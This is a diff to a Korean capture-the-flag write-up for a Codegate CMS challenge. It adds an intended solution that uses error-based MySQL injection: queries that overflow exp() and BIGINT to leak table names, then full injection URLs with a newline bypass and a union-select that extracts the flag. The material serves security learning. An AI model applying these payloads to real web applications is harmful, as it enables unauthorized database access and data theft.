@@ -118,7 +118,7 @@ col 인자로 받는 값은 Quote안에 들어가지 않고 괄호에 들어가�
 
 ## Exploit
 
-### SQL Injection
+### SQL Injection - Unintended solution
 
 col에 #을 넣고 search에 개행문자(%0a)를 삽입하여 보내게 되면 다음과 같이 쿼리가 만들 수 있다.
 
@@ -156,3 +156,43 @@ idx	title	id
 
 
 **flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}**
+
+
+
+### Error based SQL Inection - Intended Solution
+
+이 부분은 대회 끝나고 로컬에서 테스트하였다.
+
+원래 mysql 데이터 베이스는 권한때문에 사용이 불가능한데, 이번 문제는 root로 구현되서 사용할 수 있었던 것 같다.
+
+mysql 데이터 베이스를 사용하지 않고 Mysql Trick을 이용해 Error기반으로 테이블 명을 추출할 수 있다.
+
+```
+mysql> select * from 36796d6e43576648344a_board where LOWER(1)^exp(~id);
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(`codegate_cms`.`36796d6e43576648344a_board`.`id`))'
+
+mysql> select * from 36796d6e43576648344a_board where LOWER(1)^id-~1;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((<cache>(lower(1)) ^ `codegate_cms`.`36796d6e43576648344a_board`.`id`) - <cache>(~(1)))'
+```
+
+```
+http://10.211.55.4/cms/index.php?act=board&mid=search&col=%23&type=1&search=%0a1)^exp(~id)%23
+
+DOUBLE value is out of range in 'exp(~(`codegate_cms`.`36796d6e43576648344a_board`.`id`))'
+
+http://10.211.55.4/cms/index.php?act=board&mid=search&col=%23&type=1&search=%0a1)^id-~1%23
+
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((<cache>(lower(1)) ^ `codegate_cms`.`36796d6e43576648344a_board`.`id`) - <cache>(~(1)))'
+```
+
+테이블의 prefix는 고정으므로 flag의 테이블은 `36796d6e43576648344a_flag` 임을 알 수 있다.
+
+그 후에는 테이블 명이 몰라도 뽑을 수 있는 방법으로 뽑아주면 된다.
+
+```
+http://10.211.55.4/cms/index.php?act=board&mid=search&col=%23&type=1&search=%0a0)%20union%20select%201,2,3,a,5%20from%20(select%201,2,3%20a,4%20union%20select%20*%20from%2036796d6e43576648344a_flag%20limit%201,1)a%23
+
+idx	title	id
+1	2	flag{flagflagflagffagflaglfaglfag}
+```
+
